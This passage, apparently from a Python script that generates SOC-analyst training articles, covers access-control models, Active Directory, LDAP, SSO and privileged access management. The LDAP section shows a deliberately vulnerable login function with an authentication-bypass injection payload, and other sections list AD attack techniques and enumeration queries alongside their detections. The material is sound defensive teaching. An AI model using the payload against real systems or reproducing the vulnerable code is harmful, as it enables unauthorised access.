  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::security-reports/*",
      "Condition": {
        "StringEquals": {
          "aws:PrincipalTag/Department": "Security",
          "s3:ExistingObjectTag/Classification": "Internal"
        },
        "IpAddress": {
          "aws:SourceIp": "10.0.0.0/8"
        },
        "DateGreaterThan": {
          "aws:CurrentTime": "2025-01-01T08:00:00Z"
        },
        "DateLessThan": {
          "aws:CurrentTime": "2025-01-01T18:00:00Z"
        }
      }
    }
  ]
}
```

This policy allows reading S3 objects only when ALL conditions are true: user is in Security department, object is classified Internal, request comes from corporate network, and it is during business hours.

## Model Comparison Matrix

| Feature | DAC | MAC | RBAC | ABAC |
|---------|-----|-----|------|------|
| Access decision by | Resource owner | System labels | Role membership | Policy engine |
| Granularity | Per-user, per-resource | Per-label level | Per-role | Per-attribute combination |
| Flexibility | High | Low | Medium | Very high |
| Administration | Decentralized | Centralized | Centralized | Centralized |
| Scalability | Poor at scale | Good | Good | Excellent |
| Complexity | Low | High | Medium | High |
| Compliance fit | Low | High (gov/mil) | Medium-High | High |
| Common use | File systems, databases | Military, gov systems | Enterprise apps, AD | Cloud platforms, APIs |

## When to Use Each Model

```
DAC  — Small teams, file sharing, development environments
       Acceptable when data sensitivity is low and users are trusted

MAC  — Government classified systems, military networks, healthcare
       Required when regulatory compliance mandates label-based controls

RBAC — Enterprise applications, IT service management, SOC platforms
       Best when job functions map cleanly to permission sets

ABAC — Cloud environments, complex multi-tenant platforms, APIs
       Needed when access decisions depend on context (time, location, device)

Hybrid — Most real-world systems combine models
         Example: RBAC for base permissions + ABAC conditions for sensitive ops
```

## The Least Privilege Principle

Regardless of model, least privilege is foundational:

| Practice | Implementation |
|----------|---------------|
| Start with zero access | New accounts get no permissions by default |
| Grant minimum needed | Only permissions required for current job function |
| Time-bound access | Elevated access expires automatically |
| Regular access reviews | Quarterly review of all role assignments |
| Just-in-time elevation | Request and approve temporary privilege escalation |
| Separate admin accounts | Daily-use account has no admin rights |

## SOC Analyst Relevance

- **Investigate privilege escalation**: Detect when users gain unauthorized role memberships
- **Audit access policies**: Review whether RBAC/ABAC policies match organizational intent
- **Detect policy bypass**: Alert on access that should have been denied
- **Access review support**: Help identify overprivileged accounts during periodic reviews
- **Incident scoping**: Determine what a compromised account could access based on its roles
"""))

    # ---------------------------------------------------------------
    # Article 3: Active Directory Fundamentals for Security Analysts
    # ---------------------------------------------------------------
    articles.append(("Active Directory Fundamentals for Security Analysts", ["identity", "access-management", "active-directory", "windows", "ldap", "kerberos"], r"""# Active Directory Fundamentals for Security Analysts

## Overview

Active Directory (AD) is Microsoft's directory service that provides authentication, authorization, and centralized management for Windows domain environments. Nearly every enterprise Windows network runs AD, making it a primary target for attackers and a critical knowledge area for SOC analysts.

AD stores information about network objects (users, computers, groups, printers) and provides services for locating, managing, and authenticating access to those objects.

## AD Logical Structure

### Forest, Domain, and Trust Hierarchy

```
Forest: contoso.com (security boundary)
  |
  +-- Domain: contoso.com (root domain)
  |     +-- OU: Corporate
  |     |     +-- OU: Finance
  |     |     +-- OU: HR
  |     +-- OU: Servers
  |
  +-- Domain: dev.contoso.com (child domain)
  |     +-- OU: Engineering
  |
  +-- Domain: eu.contoso.com (child domain)
        +-- OU: London
        +-- OU: Berlin
```

| Component | Description | Security Relevance |
|-----------|-------------|-------------------|
| Forest | Top-level container; security and replication boundary | Compromise of one domain can lead to forest-wide compromise |
| Domain | Administrative boundary within a forest | Each domain has its own security policies and admin accounts |
| Organizational Unit (OU) | Container for organizing objects within a domain | GPOs are linked to OUs for policy application |
| Site | Physical network topology grouping | Controls replication traffic and service location |
| Tree | Hierarchy of domains sharing contiguous DNS namespace | Trust relationships flow along the tree |

### Key AD Objects

| Object Type | Description | Key Attributes |
|-------------|-------------|----------------|
| User | Person or service identity | sAMAccountName, userPrincipalName, memberOf |
| Computer | Domain-joined machine | dNSHostName, operatingSystem, servicePrincipalName |
| Group | Collection of objects for permission assignment | member, groupType, managedBy |
| GPO | Group Policy Object for configuration management | gPCFileSysPath, displayName |
| OU | Organizational container | description, gpLink |

## Group Types and Scopes

Understanding group scopes is critical for analyzing effective permissions:

| Scope | Can Contain | Can Be Used In | Purpose |
|-------|-------------|----------------|---------|
| Domain Local | Users/groups from any domain in forest | Same domain only | Assign permissions to resources |
| Global | Users/groups from same domain only | Any domain in forest | Organize users by role |
| Universal | Users/groups from any domain in forest | Any domain in forest | Forest-wide role assignments |

### Best Practice: AGDLP Strategy

```
A  = Accounts (users) are placed in
G  = Global groups (by role/department), which are nested in
DL = Domain Local groups (by resource permission), which are assigned
P  = Permissions on resources

Example:
  User "jane.analyst" --> Global group "SOC-Analysts"
  Global group "SOC-Analysts" --> Domain Local group "DL-SIEMLogs-Read"
  "DL-SIEMLogs-Read" --> Read permission on \\fileserver\siemlogs
```

## Active Directory Trusts

| Trust Type | Direction | Transitivity | Use Case |
|------------|-----------|-------------|----------|
| Parent-child | Two-way | Transitive | Automatic between parent and child domains |
| Tree-root | Two-way | Transitive | Automatic between trees in same forest |
| Forest | One-way or two-way | Transitive | Between separate forests |
| External | One-way or two-way | Non-transitive | To a specific domain in another forest |
| Shortcut | One-way or two-way | Transitive | Optimize auth between distant domains |
| Realm | One-way or two-way | Configurable | To non-Windows Kerberos realm |

### Enumerating Trusts (Investigation)

```powershell
# List all trusts for current domain
Get-ADTrust -Filter *

# Detailed trust information
Get-ADTrust -Filter * | Select Name, Direction, TrustType, IntraForest

# Using nltest
nltest /domain_trusts /all_trusts

# From cmd
netdom trust contoso.com /domain:partner.com /verify
```

## AD Replication and Sites

AD uses multi-master replication — changes can be made on any domain controller (DC):

```
DC01 (NYC) <--replication--> DC02 (London) <--replication--> DC03 (Tokyo)

Intra-site replication: Near-instant (within 15 seconds via notification)
Inter-site replication: Scheduled (default 180 minutes, configurable)
```

### Security Concern: Replication Abuse

```
DCSync attack: Attacker with Replicating Directory Changes rights
  can request password hashes from a DC via the replication protocol

Detection — Event ID 4662:
  Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  (DS-Replication-Get-Changes)
  Properties: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  (DS-Replication-Get-Changes-All)
  SubjectUserName is NOT a domain controller account = SUSPICIOUS
```

## Group Policy Objects (GPOs)

GPOs apply configuration settings to users and computers in OUs.

### GPO Processing Order: LSDOU

```
L = Local policy       (applied first, lowest precedence)
S = Site policy
D = Domain policy
OU = OU policies        (applied last, highest precedence)
     Nested OUs apply parent first, then child

If conflict: Last applied wins (OU policy beats domain policy)
Exception: "Enforced" GPOs cannot be overridden by lower-level settings
Exception: "Block Inheritance" on OU blocks higher-level GPOs (unless enforced)
```

### Security-Relevant GPO Settings

| GPO Setting | Path | Purpose |
|-------------|------|---------|
| Audit Policy | Computer Config > Policies > Windows Settings > Security Settings > Advanced Audit Policy | Enable security logging |
| Password Policy | Computer Config > Policies > Windows Settings > Security Settings > Account Policies | Password length, complexity, age |
| User Rights Assignment | Computer Config > Policies > Windows Settings > Security Settings > Local Policies | Who can log on locally, remotely, etc. |
| Restricted Groups | Computer Config > Policies > Windows Settings > Security Settings | Enforce group membership |
| Software Restriction | Computer Config > Policies > Windows Settings > Security Settings > Software Restriction Policies | Application whitelisting |
| AppLocker | Computer Config > Policies > Windows Settings > Security Settings > Application Control | Advanced app whitelisting |

### Querying GPOs

```powershell
# List all GPOs in domain
Get-GPO -All | Select DisplayName, Id, ModificationTime | Sort ModificationTime -Desc

# Get GPO details
Get-GPOReport -Name "Security Baseline" -ReportType Html -Path C:\temp\gpo_report.html

# Find which OUs a GPO is linked to
(Get-GPO -Name "Security Baseline").GenerateReport("xml") | Select-String "SOMPath"

# Check GPO application on a specific computer
gpresult /r /scope computer
gpresult /h C:\temp\gpresult.html
```

## What SOC Analysts Need to Know

### Critical AD Events to Monitor

| Event ID | Description | Why It Matters |
|----------|-------------|----------------|
| 4720 | User account created | New account creation (persistence) |
| 4726 | User account deleted | Evidence destruction |
| 4728/4732/4756 | Member added to security group | Privilege escalation |
| 4729/4733/4757 | Member removed from security group | Covering tracks |
| 4740 | Account locked out | Brute force indicator |
| 4767 | Account unlocked | May indicate social engineering |
| 4662 | Operation performed on AD object | DCSync detection |
| 5136 | Directory service object modified | AD object tampering |
| 5137 | Directory service object created | Rogue object creation |

### Common AD Attack Paths

```
1. Kerberoasting: Request TGS tickets for SPNs, crack offline
   Detection: Event 4769 with ticket encryption type 0x17 (RC4)

2. AS-REP Roasting: Target accounts without pre-auth required
   Detection: Event 4768 with pre-auth type 0 (no pre-auth)

3. Golden Ticket: Forged TGT using KRBTGT hash
   Detection: TGT with abnormal lifetime, Event 4769 anomalies

4. DCSync: Replicate password hashes from DC
   Detection: Event 4662 with replication GUIDs from non-DC source

5. AdminSDHolder abuse: Modify protected object permissions
   Detection: Event 5136 on CN=AdminSDHolder container
```

### Essential AD Investigation Commands

```powershell
# Find recently created accounts
Get-ADUser -Filter {whenCreated -ge "2025-01-01"} -Properties whenCreated |
    Select Name, SamAccountName, whenCreated | Sort whenCreated -Desc

# Find accounts with password never expires
Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires |
    Select Name, SamAccountName

# List members of privileged groups
Get-ADGroupMember "Domain Admins" -Recursive | Select Name, objectClass
Get-ADGroupMember "Enterprise Admins" -Recursive | Select Name, objectClass

# Find disabled accounts still in privileged groups
Get-ADGroupMember "Domain Admins" | Get-ADUser -Properties Enabled |
    Where {-not $_.Enabled} | Select Name

# Check last logon time for an account
Get-ADUser -Identity "jane.analyst" -Properties LastLogonTimestamp |
    Select Name, @{N='LastLogon';E={[DateTime]::FromFileTime($_.LastLogonTimestamp)}}
```

## Key Takeaways

- AD is the backbone of Windows enterprise authentication and the top target for attackers
- Forest is the true security boundary, not the domain
- Group scopes and nesting determine effective permissions
- GPO processing order (LSDOU) controls which policies win
- Monitor AD changes relentlessly: group membership, account creation, replication events
- Understand common AD attack techniques to build effective detections
"""))

    # ---------------------------------------------------------------
    # Article 4: LDAP and Directory Services
    # ---------------------------------------------------------------
    articles.append(("LDAP and Directory Services", ["identity", "access-management", "ldap", "directory-services", "active-directory", "ldaps"], r"""# LDAP and Directory Services

## Overview

LDAP (Lightweight Directory Access Protocol) is the standard protocol for accessing and managing directory services. It provides a structured, hierarchical way to store and query identity data such as user accounts, groups, computers, and organizational information. Active Directory, OpenLDAP, and 389 Directory Server all implement LDAP.

For SOC analysts, understanding LDAP is essential for investigating authentication events, writing queries to enumerate directory objects, detecting LDAP-based attacks, and understanding how applications authenticate against directory services.

## How LDAP Works

LDAP follows a client-server model over TCP port 389 (plaintext) or port 636 (LDAPS/TLS):

```
Client                          LDAP Server (Directory)
  |                                     |
  |--- BIND (authenticate) ----------->|
  |<-- BIND response (success/fail) ---|
  |                                     |
  |--- SEARCH (query for objects) ----->|
  |<-- SEARCH result entries -----------|
  |<-- SEARCH result done --------------|
  |                                     |
  |--- MODIFY (change attributes) ----->|
  |<-- MODIFY response -----------------|
  |                                     |
  |--- UNBIND (close connection) ------>|
```

### LDAP Ports

| Port | Protocol | Description |
|------|----------|-------------|
| 389 | LDAP | Plaintext LDAP (or STARTTLS upgrade) |
| 636 | LDAPS | LDAP over TLS (encrypted from connection start) |
| 3268 | GC | Global Catalog (cross-domain queries, read-only) |
| 3269 | GC-SSL | Global Catalog over TLS |

## Distinguished Names (DNs)

Every LDAP object has a unique Distinguished Name that specifies its full path in the directory tree:

```
DN: CN=Jane Analyst,OU=SOC,OU=Security,DC=contoso,DC=com

Components:
  CN  = Common Name (leaf object name)
  OU  = Organizational Unit (container)
  DC  = Domain Component (domain name parts)

Reading right to left: contoso.com > Security OU > SOC OU > Jane Analyst

Other DN components:
  O   = Organization
  L   = Locality
  ST  = State
  C   = Country
  UID = User ID
```

### Relative Distinguished Name (RDN)

The RDN is the leftmost component: `CN=Jane Analyst` uniquely identifies the object within its parent container.

## LDAP Operations

| Operation | Purpose | Example Use Case |
|-----------|---------|-----------------|
| Bind | Authenticate to directory | Application authenticating with service account |
| Search | Query for objects matching criteria | Find all users in the SOC team |
| Compare | Check if attribute has specific value | Verify group membership |
| Add | Create new directory object | Provisioning new user account |
| Delete | Remove directory object | De-provisioning terminated employee |
| Modify | Change object attributes | Update phone number, reset password |
| Modify DN | Move or rename object | Transfer user to different OU |
| Unbind | Close the connection | Clean session termination |
| Extended | Protocol extensions | STARTTLS, password change |

### Bind Types

```
1. Simple Bind (plaintext credentials)
   DANGER: Password sent in cleartext unless TLS is used
   ldapsearch -x -H ldap://dc01.contoso.com -D "CN=svc_app,OU=Services,DC=contoso,DC=com" -w "P@ssw0rd"

2. SASL Bind (secure authentication)
   Uses mechanisms like GSSAPI (Kerberos), DIGEST-MD5, EXTERNAL (TLS cert)
   ldapsearch -H ldap://dc01.contoso.com -Y GSSAPI

3. Anonymous Bind (no credentials)
   Some directories allow limited anonymous access
   ldapsearch -x -H ldap://dc01.contoso.com -b "DC=contoso,DC=com" -s base
```

## LDAP Search Syntax

### Search Components

| Component | Description | Example |
|-----------|-------------|---------|
| Base DN | Starting point for search | `DC=contoso,DC=com` |
| Scope | How deep to search | base, one (one level), sub (subtree) |
| Filter | Criteria for matching objects | `(&(objectClass=user)(department=Security))` |
| Attributes | Which attributes to return | `cn sAMAccountName mail memberOf` |

### LDAP Filter Syntax

```
Equality:       (attribute=value)
Presence:       (attribute=*)
Substring:      (attribute=*partial*)
Greater/equal:  (attribute>=value)
Less/equal:     (attribute<=value)
AND:            (&(filter1)(filter2))
OR:             (|(filter1)(filter2))
NOT:            (!(filter))
```

### Common LDAP Queries for SOC Investigation

```bash
# Find all user accounts
ldapsearch -x -H ldaps://dc01.contoso.com -D "svc_query@contoso.com" -W \
  -b "DC=contoso,DC=com" "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName displayName whenCreated lastLogonTimestamp

# Find accounts with password never expires
ldapsearch -x -H ldaps://dc01.contoso.com -D "svc_query@contoso.com" -W \
  -b "DC=contoso,DC=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" \
  sAMAccountName displayName

# Find disabled accounts
ldapsearch -x -H ldaps://dc01.contoso.com -D "svc_query@contoso.com" -W \
  -b "DC=contoso,DC=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" \
  sAMAccountName

# Find members of Domain Admins
ldapsearch -x -H ldaps://dc01.contoso.com -D "svc_query@contoso.com" -W \
  -b "DC=contoso,DC=com" \
  "(&(objectClass=group)(cn=Domain Admins))" member

# Find accounts with no pre-authentication required (AS-REP roastable)
ldapsearch -x -H ldaps://dc01.contoso.com -D "svc_query@contoso.com" -W \
  -b "DC=contoso,DC=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# Find accounts with SPNs (Kerberoastable)
ldapsearch -x -H ldaps://dc01.contoso.com -D "svc_query@contoso.com" -W \
  -b "DC=contoso,DC=com" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# Find recently modified objects (last 24 hours)
ldapsearch -x -H ldaps://dc01.contoso.com -D "svc_query@contoso.com" -W \
  -b "DC=contoso,DC=com" \
  "(&(objectClass=user)(whenChanged>=20250101000000.0Z))" \
  sAMAccountName whenChanged
```

## LDAP Injection

LDAP injection occurs when user input is incorporated into LDAP queries without proper sanitization.

### Vulnerable Code Example

```python
# VULNERABLE - user input directly in filter
def authenticate(username, password):
    ldap_filter = f"(&(uid={username})(userPassword={password}))"
    result = ldap_conn.search_s(base_dn, ldap.SCOPE_SUBTREE, ldap_filter)
    return len(result) > 0

# Attack input:  username = "*)(uid=*))(|(uid=*"
# Resulting filter: (&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
# This matches ALL users, bypassing authentication
```

### Secure Code

```python
# SECURE - parameterized search and input validation
import re

def authenticate(username, password):
    # Validate input - reject LDAP special characters
    if re.search(r'[*()\\\x00/]', username):
        raise ValueError("Invalid characters in username")

    # Use bind authentication instead of search comparison
    user_dn = f"uid={ldap.dn.escape_dn_chars(username)},ou=users,dc=contoso,dc=com"
    try:
        conn = ldap.initialize("ldaps://dc01.contoso.com")
        conn.simple_bind_s(user_dn, password)
        return True
    except ldap.INVALID_CREDENTIALS:
        return False
```

### LDAP Injection Characters to Monitor

| Character | Purpose in LDAP | Injection Risk |
|-----------|----------------|----------------|
| `*` | Wildcard | Matches any value |
| `(` `)` | Filter grouping | Alter filter logic |
| `\` | Escape character | Bypass sanitization |
| `NUL` (\x00) | String terminator | Truncate filter |
| `/` | DN separator in some contexts | Path manipulation |
| `\|` | OR operator | Broaden search scope |
| `&` | AND operator | Modify filter logic |

## Secure LDAP (LDAPS)

```
Plaintext LDAP (port 389):
  Credentials and data transmitted in cleartext
  Vulnerable to sniffing, MITM attacks

LDAPS (port 636):
  TLS encryption from connection establishment
  Requires valid certificate on LDAP server
  Client should validate server certificate

STARTTLS (port 389, upgraded):
  Starts plaintext, upgrades to TLS via extended operation
  Risk: downgrade attacks if not enforced

Recommendation:
  - Always use LDAPS (port 636) or enforce STARTTLS
  - Disable plaintext LDAP binds via GPO
  - Monitor for plaintext LDAP authentications (Event ID 2889 on DCs)
```

### Enforcing LDAP Signing and Channel Binding

```powershell
# Check current LDAP signing requirement on DC
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
  -Name "LDAPServerIntegrity"
# 0 = None, 1 = Require if supported, 2 = Required

# Enable via GPO:
# Computer Configuration > Policies > Windows Settings > Security Settings
#   > Local Policies > Security Options
#   > "Domain controller: LDAP server signing requirements" = "Require signing"
```

## Monitoring LDAP Activity

```
# Key events for LDAP monitoring

Windows Event ID 2889: LDAP plaintext bind detected
  Source: Directory Service
  Indicates a client performed simple bind without TLS

Windows Event ID 1644: LDAP search performance (if enabled)
  Shows expensive LDAP queries — attackers enumerating AD

# Enable LDAP diagnostics logging on DC:
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics" `
  -Name "16 LDAP Interface Events" -Value 2

# Detect unusual LDAP query volume
# Network monitoring: high volume of port 389/636 traffic from non-DC source
# SIEM rule: alert on > 1000 LDAP queries per minute from single source
```

## Key Takeaways

- LDAP is the protocol underlying AD and other directory services
- Always use LDAPS or STARTTLS to protect credentials in transit
- LDAP queries are essential tools for SOC investigations and enumeration
- LDAP injection is a real vulnerability class requiring input validation
- Monitor for plaintext binds, excessive queries, and unusual search patterns
- Understanding DN structure helps navigate directory hierarchies during investigations
"""))

    # ---------------------------------------------------------------
    # Article 5: Single Sign-On Architectures
    # ---------------------------------------------------------------
    articles.append(("Single Sign-On Architectures", ["identity", "access-management", "sso", "saml", "oidc", "kerberos", "authentication"], r"""# Single Sign-On Architectures

## Overview

Single Sign-On (SSO) allows users to authenticate once and gain access to multiple applications and services without re-entering credentials. While SSO dramatically improves user experience and reduces password fatigue, it also concentrates authentication risk. If the SSO provider is compromised, all connected applications are at risk.

SOC analysts must understand SSO architectures to investigate token-based attacks, detect session hijacking, analyze authentication flows in logs, and assess the blast radius of identity provider compromises.

## How SSO Works

```
                      User
                       |
                  (1) Access App A
                       |
                       v
                 +-----+-----+
                 |   App A    |  (2) No session? Redirect to IdP
                 +-----+-----+
                       |
                       v
              +--------+--------+
              | Identity Provider| (3) User authenticates (once)
              |   (IdP)         | (4) IdP issues token/assertion
              +--------+--------+
                       |
            (5) Redirect back with token
                       |
                       v
                 +-----+-----+
                 |   App A    |  (6) Validates token, creates session
                 +-----+-----+

Later, user accesses App B:
  - App B redirects to IdP
  - IdP sees existing session, issues new token without re-auth
  - App B validates token, grants access
```

## SSO Protocols

### SAML 2.0 (Security Assertion Markup Language)

SAML is the dominant SSO protocol in enterprise environments, using XML-based assertions.

```
SAML Flow (SP-Initiated):

1. User visits Service Provider (SP) — e.g., https://app.example.com
2. SP generates SAML AuthnRequest, redirects user to IdP
3. IdP authenticates user (if no existing session)
4. IdP generates SAML Response containing Assertion
5. User's browser POSTs SAML Response to SP's ACS URL
6. SP validates assertion signature, extracts attributes, creates session

Key SAML Components:
  - Identity Provider (IdP): Authenticates users (Okta, Azure AD, Ping)
  - Service Provider (SP): Application that trusts the IdP
  - Assertion: XML document with authentication and attribute statements
  - ACS URL: Assertion Consumer Service — SP endpoint receiving assertions
  - Entity ID: Unique identifier for each SAML participant
  - Metadata: XML describing IdP/SP capabilities and certificates
```

### SAML Assertion Structure

```xml
<saml:Assertion>
  <saml:Issuer>https://idp.contoso.com</saml:Issuer>
  <ds:Signature><!-- XML digital signature --></ds:Signature>
  <saml:Subject>
    <saml:NameID>jane.analyst@contoso.com</saml:NameID>
  </saml:Subject>
  <saml:Conditions NotBefore="2025-01-15T10:00:00Z"
                   NotOnOrAfter="2025-01-15T10:05:00Z">
    <saml:AudienceRestriction>
      <saml:Audience>https://app.example.com</saml:Audience>
    </saml:AudienceRestriction>
  </saml:Conditions>
  <saml:AuthnStatement AuthnInstant="2025-01-15T10:00:00Z">
    <saml:AuthnContext>
      <saml:AuthnContextClassRef>
        urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
      </saml:AuthnContextClassRef>
    </saml:AuthnContext>
  </saml:AuthnStatement>
  <saml:AttributeStatement>
    <saml:Attribute Name="Role"><saml:AttributeValue>SOC-Analyst</saml:AttributeValue></saml:Attribute>
    <saml:Attribute Name="Department"><saml:AttributeValue>Security</saml:AttributeValue></saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>
```

### OpenID Connect (OIDC)

OIDC is built on top of OAuth 2.0 and uses JSON-based tokens. It is the standard for modern web and mobile applications.

```
OIDC Authorization Code Flow:

1. User clicks "Log in" on App
2. App redirects to IdP authorization endpoint:
   GET https://idp.contoso.com/authorize?
     response_type=code&
     client_id=app123&
     redirect_uri=https://app.example.com/callback&
     scope=openid profile email&
     state=random_csrf_token&
     nonce=random_replay_protection

3. User authenticates at IdP
4. IdP redirects back with authorization code:
   GET https://app.example.com/callback?code=AUTH_CODE&state=random_csrf_token

5. App exchanges code for tokens (server-to-server):
   POST https://idp.contoso.com/token
   grant_type=authorization_code&code=AUTH_CODE&client_secret=SECRET

6. IdP returns: access_token, id_token (JWT), refresh_token
7. App validates id_token, extracts user identity
```

### Kerberos SSO

Kerberos provides SSO within Windows Active Directory domains:

```
Kerberos Authentication Flow:

1. User logs into workstation
   -> Client sends AS-REQ to KDC (Key Distribution Center)
   <- KDC returns TGT (Ticket Granting Ticket) encrypted with KRBTGT key

2. User accesses network resource (e.g., file share)
   -> Client presents TGT, requests TGS (Ticket Granting Service) ticket
   <- KDC issues TGS ticket for the specific service

3. Client presents TGS ticket to the service
   -> Service validates ticket, grants access

No password transmitted after initial login.
TGT is cached and reused (default lifetime: 10 hours, renewable: 7 days)
```

## SSO Protocol Comparison

| Feature | SAML 2.0 | OIDC | Kerberos |
|---------|----------|------|----------|
| Token format | XML assertion | JWT (JSON) | Binary ticket |
| Transport | HTTP POST/Redirect | HTTPS | UDP/TCP port 88 |
| Best for | Enterprise web apps | Modern web/mobile/APIs | On-premises Windows |
| Token size | Large (XML) | Compact (Base64 JSON) | Small (binary) |
| Mobile support | Limited | Excellent | Limited |
| API support | Poor | Excellent | Poor |
| Encryption | Optional XML encryption | TLS transport | Built-in symmetric encryption |
| Standard body | OASIS | OpenID Foundation/IETF | MIT/IETF (RFC 4120) |

## SSO Security Risks and Attack Surface

| Attack | Description | Mitigation |
|--------|-------------|------------|
| Golden SAML | Forge SAML assertions with stolen IdP signing key | Protect IdP signing keys with HSM, rotate keys |
| Token theft | Steal SSO token from browser or network | Secure cookies (HttpOnly, Secure, SameSite), use short token lifetime |
| Session fixation | Attacker sets session ID before authentication | Regenerate session ID after authentication |
| IdP compromise | Single point of failure for all apps | Harden IdP, MFA for admin access, monitoring |
| Replay attacks | Reuse captured SAML assertions | Enforce NotOnOrAfter, use nonces, one-time-use assertions |
| Redirect manipulation | Tamper with redirect URIs to steal codes/tokens | Strict redirect URI validation, exact match only |
| MFA fatigue via SSO | One MFA approval grants access to all apps | Step-up authentication for sensitive apps |

### Detecting SSO Attacks

```
# Monitor for Golden SAML indicators
- SAML assertions with unusual issuers or signing certificates
- Assertions valid for abnormally long durations
- Authentication without corresponding IdP login event
- Token claims that don't match IdP configuration

# Azure AD sign-in log analysis
AuditLogs
| where OperationName == "Sign-in activity"
| where ResultType == 0  // successful
| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress,
          AuthenticationRequirement, TokenIssuerType
| where TokenIssuerType != "AzureAD"  // external token issuer

# Detect SSO session anomalies
- Same session used from multiple IP addresses
- Session used after user's working hours
- Access to unusual applications from SSO session
- Geographic impossibility between SSO events
```

## Session Management Best Practices

| Practice | Recommendation |
|----------|---------------|
| Session lifetime | 8-12 hours for standard, 1 hour for privileged apps |
| Idle timeout | 15-30 minutes of inactivity |
| Token storage | HttpOnly cookies, not localStorage |
| Session binding | Bind to IP or device fingerprint |
| Re-authentication | Require fresh auth for sensitive operations |
| Logout | Implement both local and global (IdP) logout |
| Monitoring | Log all session creation, refresh, and termination events |

## SSO Architecture Decision Matrix

| Requirement | Recommended Protocol |
|-------------|---------------------|
| Enterprise SaaS apps (Salesforce, ServiceNow) | SAML 2.0 |
| Custom web applications | OIDC |
| Mobile applications | OIDC (Authorization Code + PKCE) |
| API-to-API authentication | OAuth 2.0 Client Credentials |
| On-premises Windows network | Kerberos |
| B2B partner access | SAML 2.0 or OIDC Federation |
| Government/regulated | SAML 2.0 with PIV/CAC |

## Key Takeaways

- SSO centralizes authentication which improves usability but concentrates risk
- SAML is dominant in enterprise, OIDC for modern and mobile, Kerberos for on-prem Windows
- Golden SAML and token theft are critical SSO attack vectors
- Session management is as important as the authentication protocol itself
- Monitor IdP logs, token issuance events, and cross-application session patterns
- Implement step-up authentication for sensitive resources even within SSO
"""))

    # ---------------------------------------------------------------
    # Article 6: Privileged Access Management Concepts
    # ---------------------------------------------------------------
    articles.append(("Privileged Access Management Concepts", ["identity", "access-management", "pam", "privileged-access", "credential-vaulting", "jit-access"], r"""# Privileged Access Management Concepts

## Overview

Privileged Access Management (PAM) is a security discipline focused on controlling, monitoring, and auditing access to critical systems by accounts with elevated permissions. Privileged accounts — domain admins, root, database admins, cloud service accounts — are the highest-value targets for attackers because compromising one can give access to entire environments.

SOC analysts interact with PAM in multiple ways: investigating alerts about privileged account misuse, reviewing session recordings during incident response, validating that emergency access procedures were properly followed, and detecting privilege creep during access reviews.

## What PAM Solves

| Problem | Without PAM | With PAM |
|---------|-------------|----------|
| Shared passwords | Everyone knows the root password | Passwords vaulted and rotated automatically |
| Permanent privileges | Admins always have elevated access | Just-in-time access granted temporarily |
| No audit trail | Cannot prove who did what with admin access | Full session recording and keystroke logging |
| Password reuse | Same admin password on 50 servers | Unique, rotated passwords per system |
| Stale access | Former employees retain admin rights | Automatic access expiration and review |
| Lateral movement | One admin credential compromises many systems | Credential isolation per system |

## Privilege Creep

Privilege creep occurs when users accumulate permissions over time as they change roles, work on projects, or receive temporary access that is never revoked.

```
Timeline of privilege creep:

Year 1: Jane joins as Junior Analyst
  -> SOC-Analysts group, read-only SIEM access

Year 2: Jane helps with IR project
  -> Added to IR-Team group, gets endpoint access
  -> Project ends, access NOT removed

Year 3: Jane covers for senior engineer on leave
  -> Added to SOC-Engineers group, gets rule editing
  -> Engineer returns, Jane's access NOT removed

Year 4: Jane moves to Threat Intel team
  -> Added to TI-Analysts group, gets intel platform access
  -> Still has ALL previous access from years 1-3

Result: Jane has far more access than her current role requires
```

### Detecting Privilege Creep

```
# PowerShell — find users in multiple privileged groups
$privilegedGroups = @("Domain Admins","Server Operators","Backup Operators",
                      "Account Operators","Enterprise Admins")
$results = @{}
foreach ($group in $privilegedGroups) {
    Get-ADGroupMember $group -Recursive | ForEach-Object {
        if (-not $results[$_.SamAccountName]) {
            $results[$_.SamAccountName] = @()
        }
        $results[$_.SamAccountName] += $group
    }
}
$results.GetEnumerator() | Where { $_.Value.Count -gt 1 } |
    ForEach { "$($_.Key): $($_.Value -join ', ')" }
```

## Just-in-Time (JIT) Access

JIT access grants elevated privileges only when needed and automatically revokes them after a defined period.

```
JIT Access Workflow:

1. ANALYST needs admin access to investigate compromised server
2. Analyst REQUESTS elevated access via PAM portal
   - Specifies: target system, reason, duration needed
3. APPROVER (SOC lead/manager) reviews and approves
4. PAM system GRANTS temporary admin credentials
   - Time-limited (e.g., 4 hours)
   - Scope-limited (specific systems only)
5. Analyst performs investigation with full audit recording
6. PAM system REVOKES access automatically when time expires
7. Password is ROTATED immediately after session ends

Benefits:
  - No standing admin access reduces attack surface
  - Every privileged session has approval record
  - Automatic cleanup eliminates forgotten access
  - Compromise of credentials during off-hours is useless
```

### Azure AD PIM (Privileged Identity Management) Example

```powershell
# Check eligible role assignments (JIT roles a user CAN activate)
Get-AzureADMSPrivilegedRoleAssignment -ProviderId "aadRoles" `
  -ResourceId $tenantId -Filter "subjectId eq '$userId' and assignmentState eq 'Eligible'"

# Activate an eligible role
Open-AzureADMSPrivilegedRoleAssignmentRequest -ProviderId "aadRoles" `
  -ResourceId $tenantId -RoleDefinitionId $globalAdminRoleId `
  -SubjectId $userId -Type "UserAdd" -AssignmentState "Active" `
  -Schedule @{Type="Once"; Duration="PT4H"} `
  -Reason "Investigating security incident INC-2025-0042"
```

## Session Recording

PAM solutions record privileged sessions for audit and forensic purposes:

| Feature | Description |
|---------|-------------|
| Video recording | Full screen capture of RDP/SSH sessions |
| Keystroke logging | Every command typed during the session |
| Command filtering | Block specific dangerous commands in real-time |
